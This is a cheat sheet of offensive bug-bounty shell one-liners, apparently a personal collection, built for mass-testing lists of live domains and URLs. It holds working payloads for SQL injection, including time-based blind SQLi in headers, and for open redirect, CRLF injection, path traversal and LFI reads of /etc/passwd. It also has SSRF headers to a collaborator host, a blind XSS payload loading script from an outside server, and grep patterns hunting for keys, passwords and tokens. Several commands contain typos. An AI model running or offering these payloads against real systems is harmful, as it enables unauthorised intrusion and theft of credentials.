# SQL Injection:
```
cat php.txt | grep ".php" | sed 's/.php.*/.php/' | sort -u | sed 's|$|%27%22%60|' | while read url ; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url \e[1;32mVulnerable\e[0m" || echo -e "$url \e[1;31mNot Vulnerable\e[0m" ; done
```
 ```
 cat urls.txt | grep ".php" | sed 's/\.php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | httpx -silent -ms "You have an error in your SQL syntax"
```
## Sensitive information disclosure throgh JS files:
```
cat *js | grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret" /path/to/directory/*.js
```

## Extract urls from JS files:
```
grep -r -oP --no-filename "(?<=('|\`|\"))(http[s]?:\/\/[a-zA-Z0-9_?&=\/\-#.]*?)(?=('|\`|\"))" *.js | sort -u
```

## Download js files from whole js.txt files:
```
#!/bin/bash

while IFS= read -r url; do
    echo "Downloading: $url"
    wget "$url" -P  /home/vijay/Desktop/Bug_Bounty/nasa/JS
done < alivejs.txt
```
## On Live Domains List (File containing Live Domains)

```
cat sub.txt | parallel -j40 'if curl -Iks -m 10 "{}/https://redirect.com" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/redirect.com" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}////;@redirect.com" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/////redirect.com" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "{} It seems an Open Redirect Found"; fi'
```
## On Parameters (File containing urls with parameters)
```
cat redirect.txt | qsreplace "https://redirect.com" | rush -j10 'if curl -Iks -m 10 "{}" | grep -q -E "^(Location|location):.*(http|https)://redirect\.com"; then echo "{}"; fi'
```


# Test case 2:
```
cat redirect.txt | qsreplace "redirect.com" | parallel -j40 'if curl -Iks -m 10 "{}" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'
```
# Test Case 3
```
cat redirect.txt | qsreplace "////;@redirect.com" | parallel -j40 'if curl -Iks -m 10 "{}" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'
```
# Test Case 4
```
cat redirect.txt | qsreplace "/////redirect.com" | parallel -j40 'if curl -Iks -m 10 "{}" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'
```
## Extract urls from Js files:
```
cat js.txt | while read line; do curl $line -s -k; done | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```

## CRLF On Live Urls with Parameters:
```
cat urls.txt | qsreplace "%0d%0acrlf:crlf" | parallel -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'
```
# Test1:
```
cat urls.txt | qsreplace "%E5%98%8D%E5%98%8Acrlf:crlf" | parallel -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'
```
# Test2:
```
cat urls.txt | qsreplace "%E5%98%8D%E5%98%8Acrlf:crlf" | parallel -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'
```

## SSRF on doamins:
# Replace $2 with your burp collaborator server.
```
cat live-domains | parallel -j40 'if curl -skL -o /dev/null "{}" -H "CF-Connecting_IP: $2" -H "From: root@$2" -H "Client-IP: $2" -H "X-Client-IP: $2" -H "X-Forwarded-For: $2" -H "X-Wap-Profile: http://$2/wap.xml" -H "Forwarded: $2" -H "True-Client-IP: $2" -H "Contact: root@$2" -H "X-Originating-IP: $2" -H "X-Real-IP: $2"; then echo "{}" | ts; fi' | tee -a ssrf-headers-out.txt
```
## SSRF on urls containing parameters:
```
cat urls.txt | qsreplace "your.burpcollaborator.server" | parallel -j40 'if curl -skL "{}" -o /dev/null; then echo "{}" | ts; fi' | tee -a ssrf-output-log.txt
```
# Test 2:
```
cat params.txt | qsreplace "http://$1" | parallel -j40 'if curl -skL "{}" -o /dev/null; then echo "{}" | ts; fi' | tee -a ssrf-output-log.txt
```

## SpringBoot Actuator Check One Liner on domains:
```
cat live-domains | parallel -j40 'if curl -skI -m 10 "{}/env" | grep -i "x-application-context" || curl -sk -m 10 "{}/actuator/env" | grep -q "sping.config.location\|spring.application.name\|JAVA_HOME" || curl -sk -m 10 "{}/env" | grep -q "sping.config.location\|spring.application.name\|JAVA_HOME" || curl -sk -m 10 "{}/actuator" | grep -q '{"_links":{"self"' || curl -sk -m 10 "{}/actuator/configprops" | grep -q "org.springframework.boot.actuate\|beans" || curl -sk -m 10 "{}/configprops" | grep -q "org.springframework.boot.actuate\|beans"; then echo "SpringBoot Actuator Found on {}"; fi' &
```

## cat params.txt | parallel -j40 'if curl -skI -m 10 "{}" | grep -i "x-application-context"; then echo "SpringBoot application context header Found on {}"; fi'


## Blind XSS:
```
cat urls.txt | qsreplace '"><script src=https://vijaysutar.bxss.in></script>' | parallel -j40 'curl -sk "{}" -o /dev/null'
```

## Reflection Check (XSS) on one domain by extracting Hidden params
```
curl -skL "https://in.yahoo.com" | grep 'type="hidden"' | grep -Eo 'name="[^\"]+"' | cut -d'"' -f2 | xargs -I@ sh -c 'if curl -skL https://in.yahoo.com/?@=testxss | grep -q "value=testxss"; then echo "reflection found from @ parameter"; fi'
```

## Find hidden parameters via Crawl on list of urls
Explanation – Takes urls list and extracts hidden parameters from the list of urls and saves unique params in the file.
```
cat alive.txt | parallel 'curl -skL "{}" | grep "type\=\"hidden\"" | grep -Eo "name\=\"[^\"]+\"" | cut -d"\"" -f2 | sort -u' | anew params.txt
```
##  Find Secrets in Javascripts files via crawling:
```
cat alive.txt | parallel 'hakrawler -plain -js -depth 2 -url {}' | rush 'python3 /root/Tools/SecretFinder/SecretFinder.py -i {} -o cli' | anew secretfinder
```
## Directory Bruteforce using dirsearch and ffuf
```
cat alive.txt | xargs -I@ sh -c 'ffuf -c -w /path/to/wordlist -D -e php,aspx,html,do,ashx -u @/FUZZ -ac -t 200' | tee -a dir-ffuf.txt
```
## Subdomain bruteforce using ffuf
```
ffuf -u https://FUZZ.domain.com -w /path/to/wordlist -v | grep "| URL |" | awk '{print $4}'
```

## Hunt LFI
```
gau http://vuln.target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```
## CORS:

```
gau testphp.vulnweb.com | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [ CORS Found]echo $url;else echo Nothing on "$url";fi;done
```

## Subdomain takeover testing using subjack
```
subjack -w subdomains.txt -a -t 100 -v -o takeover.txt -ssl
```

## Get Content-Type
```
echo abc.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
```
## Information disclosure:
```
cat host.txt | httpx -path //server-status?full=true -status-code -content-length
```
```
cat host.txt | httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -path /web-console/ -status-code -content-length
```
## Read DS_store:
```
xxd -p /home/vijay/Desktop/DS_Store | sed 's/00//g' | tr -d '\n' | sed 's/\([0-9A-F]\{2\}\)/0x\1 /g' | xxd -r -p | strings | sed 's/ptb[LN]ustr//g'
```

## Header based blind SQL injection:
```
cat sub.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
```
## NGINX Path Traversal
```
httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
```
## WP-Config Oneliner
```
cat sub.txt | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path "/wp-config.PHP" -mc 200 -t 60 -status-code
```
## Extract Sensitive Informations on /auth.json Endpoint.
```
cat sub.txt | httpx -path "/auth.json" -title -status-code -content-length -t 80 -p 80,443,8080,8443,9000,9001,9002,9003
```
## Onlines for Headi:

for i in $(cat urls); do headi -url $i;done

### LFI hunting with payload file:
```
gau HOST | gf lfi | xargs -I% -P 25 sh -c 'while read payload; do url=$(echo "%" | qsreplace "$payload"); response=$(curl -s "$url"); echo "$response" | grep -q "root:x" && echo "VULN! $url"; done < payload.txt'
```
































